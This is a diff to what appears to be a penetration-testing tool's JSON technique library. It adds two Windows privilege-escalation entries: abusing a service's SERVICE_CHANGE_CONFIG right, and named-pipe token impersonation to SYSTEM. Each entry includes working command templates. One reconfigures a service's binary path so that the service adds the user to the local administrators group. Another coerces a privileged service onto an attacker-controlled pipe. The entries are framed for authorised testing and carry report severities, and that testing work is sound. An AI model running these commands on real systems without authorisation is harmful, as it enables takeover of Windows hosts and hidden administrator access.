@@ -923,6 +923,113 @@
           "note": "The next privileged instantiation runs your DLL; membership confirms it, and the key is a persistence foothold."
         }
       ]
+    },
+    {
+      "id": "windows-service-dacl-abuse",
+      "title": "Service DACL Abuse (SERVICE_CHANGE_CONFIG)",
+      "hypothesis": "A service whose security descriptor grants your user SERVICE_CHANGE_CONFIG can be reconfigured even when you cannot stop or start it. You point its binary path at your command, or change the account it runs as to LocalSystem, and the next time it starts (a reboot, an auto-start, or a trigger you are allowed to fire) it runs your payload with its privileges. The lever is the granular right in the SDDL, so this reaches services that a full SERVICE_ALL_ACCESS check would miss. Read the descriptor with accesschk or sc sdshow, confirm you hold the config right, then set binpath or obj and wait for the start you can reach.",
+      "tool": "accesschk",
+      "tools": [
+        "accesschk",
+        "sc"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_any": [
+        "privesc.weak_service_permission",
+        "foothold.windows"
+      ],
+      "produces": [
+        "access.system"
+      ],
+      "priority": 54,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "SYSTEM or the service account where its DACL lets you reconfigure what it runs",
+      "does_not_prove": "anything unless you hold SERVICE_CHANGE_CONFIG and can reach a restart",
+      "report": {
+        "finding": "Service DACL abuse via SERVICE_CHANGE_CONFIG",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services"
+      ],
+      "commands": [
+        {
+          "tool": "accesschk",
+          "run": "accesschk.exe /accepteula -uwcqv {{user}} {{service}}",
+          "note": "Look for SERVICE_CHANGE_CONFIG (RCCE / WPWO in the SDDL) even without SERVICE_START or _STOP."
+        },
+        {
+          "tool": "sc",
+          "run": "sc qc {{service}}",
+          "note": "Note the current BINARY_PATH_NAME and SERVICE_START_NAME so you can restore them afterward."
+        },
+        {
+          "tool": "sc",
+          "run": "sc config {{service}} binPath= \"cmd /c net localgroup administrators {{user}} /add\"",
+          "note": "Reconfigure the binpath; if you only hold config and not start, changing obj= to LocalSystem for a service that auto-starts works the same on the next boot."
+        },
+        {
+          "tool": "sc",
+          "run": "sc start {{service}}",
+          "note": "Fire it if you are allowed; otherwise wait for its auto-start or a reboot, then confirm your new rights."
+        }
+      ]
+    },
+    {
+      "id": "windows-namedpipe-impersonation",
+      "title": "Named-Pipe Impersonation to SYSTEM",
+      "hypothesis": "A process that connects to a named pipe you created hands you its identity when you call ImpersonateNamedPipeClient. If you can coerce a more privileged client onto your pipe (a service you can point at a pipe path, a scheduled task, the print spooler, or a command run by a SYSTEM process), you impersonate its token, duplicate it, and spawn a process as that account. It is the primitive the Potato family automates, and it works even without SeImpersonate when the client itself connects back to you. Stand up the pipe server, trigger the privileged connection, then duplicate the captured token into a SYSTEM shell.",
+      "tool": "cmd",
+      "tools": [
+        "cmd",
+        "msfvenom"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_any": [
+        "foothold.windows"
+      ],
+      "produces": [
+        "access.system"
+      ],
+      "priority": 50,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "a token of the privileged client that connected to your pipe, duplicated into a SYSTEM process",
+      "does_not_prove": "anything unless a more privileged process actually connects to the pipe you control",
+      "report": {
+        "finding": "Named-pipe impersonation to SYSTEM",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/named-pipe-client-impersonation"
+      ],
+      "commands": [
+        {
+          "tool": "cmd",
+          "run": "whoami /priv",
+          "note": "SeImpersonate shortcuts this, but a client that connects to your pipe gives you its token even without it."
+        },
+        {
+          "tool": "cmd",
+          "run": "echo pipe-server listening on \\\\.\\pipe\\{{pipe_name}}",
+          "note": "Create the pipe server (a PrintSpoofer / GodPotato-style helper, or your own) and wait for a connection."
+        },
+        {
+          "tool": "cmd",
+          "run": "sc config {{service}} binPath= \"cmd /c echo x > \\\\.\\pipe\\{{pipe_name}}\" && sc start {{service}}",
+          "note": "Coerce a privileged client onto the pipe: a service you can reconfigure, a scheduled task, or the spooler all work."
+        },
+        {
+          "tool": "cmd",
+          "run": "whoami",
+          "note": "After ImpersonateNamedPipeClient and DuplicateTokenEx you run as the client; a SYSTEM result confirms it, then capture proof."
+        }
+      ]
     }
   ]
 }
